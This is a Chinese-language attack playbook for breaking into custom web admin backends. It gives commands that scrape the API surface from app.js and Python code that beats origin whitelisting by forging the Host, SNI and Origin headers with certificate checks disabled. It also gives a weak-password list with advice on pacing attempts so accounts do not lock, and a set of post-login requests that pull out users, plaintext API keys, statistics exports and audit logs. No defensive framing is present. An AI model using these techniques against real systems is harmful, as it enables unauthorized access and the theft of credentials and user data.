## 背景
自研 Web 后台常做两件事：
1) 校验请求来源（Origin/Referer/Host 白名单），IP 直连一律 403；
2) 前端把完整 API 面写在一个未压缩的 app.js 里。

## 手法一：从 app.js 拿全 API 面
```bash
# 首页引用哪个 js 就抓哪个
python -c "import requests;print(requests.get('https://TARGET/app.js',verify=False).text)" > app.js
grep -oE "api\(['\"][^'\"]+" app.js | sort -u
grep -oE "fetch\(['\"][^'\"]+" app.js | sort -u
```
本例拿到 23 处调用，含 `/api/auth/login`、`/api/bootstrap`、`/api/keys/{id}/reveal`、
`/api/statistics/export`、`/api/audit`、`/api/registration-log`、`/api/users`、`/api/settings`。

## 手法二：绕 FORBIDDEN_ORIGIN —— 用真实域名而不是 IP
IP 直连时 Origin/Referer/Sec-Fetch-* 怎么补都是 403 FORBIDDEN_ORIGIN。
用 FOFA 按 IP 反查主机名，拿到真实域名（本例 `example.com`，DNS 确认解析到该 IP），
然后 **Host + SNI + Origin 三者全换成域名**：

```python
import socket, ssl, json
def https_request(ip, sni, host, method, path, body=None, cookie=None):
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    ss = ctx.wrap_socket(socket.create_connection((ip,443),timeout=20), server_hostname=sni)  # SNI 关键
    h = {"Host": host, "Origin": "https://"+host, "Referer": "https://"+host+"/",
         "User-Agent":"Mozilla/5.0", "Connection":"close"}
    if cookie: h["Cookie"]=cookie
    p = b""
    if body is not None:
        p = body.encode(); h["Content-Type"]="application/json"; h["Content-Length"]=str(len(p))
    ss.sendall(("%s %s HTTP/1.1\r\n"%(method,path)).encode()
               + "".join("%s: %s\r\n"%kv for kv in h.items()).encode() + b"\r\n" + p)
    d=b""
    while True:
        c=ss.recv(65536)
        if not c: break
        d+=c
    return d.partition(b"\r\n\r\n")[2].decode("utf-8","ignore")
```

## 手法三：弱口令
自研后台常无验证码、无锁定、无频率限制，直接字典打：
`admin/admin`、`admin/123456`、`admin/admin123`、`admin/admin888`、`admin/live2`、`admin/站点词+年份`。
每账号 ≤5 次避免锁号。本例 `admin/admin888` → 200 + `role: admin`。

## 手法四：登录后把数据面吃干净
```bash
GET  /api/bootstrap                 # 一次拿全：用户/分组/实例/密钥/设置
POST /api/keys/{id}/reveal          # 取回 API key 明文（只读）
GET  /api/statistics/export?view=users&range=all
GET  /api/statistics/export?view=details&range=all
GET  /api/audit ; GET /api/registration-log
```
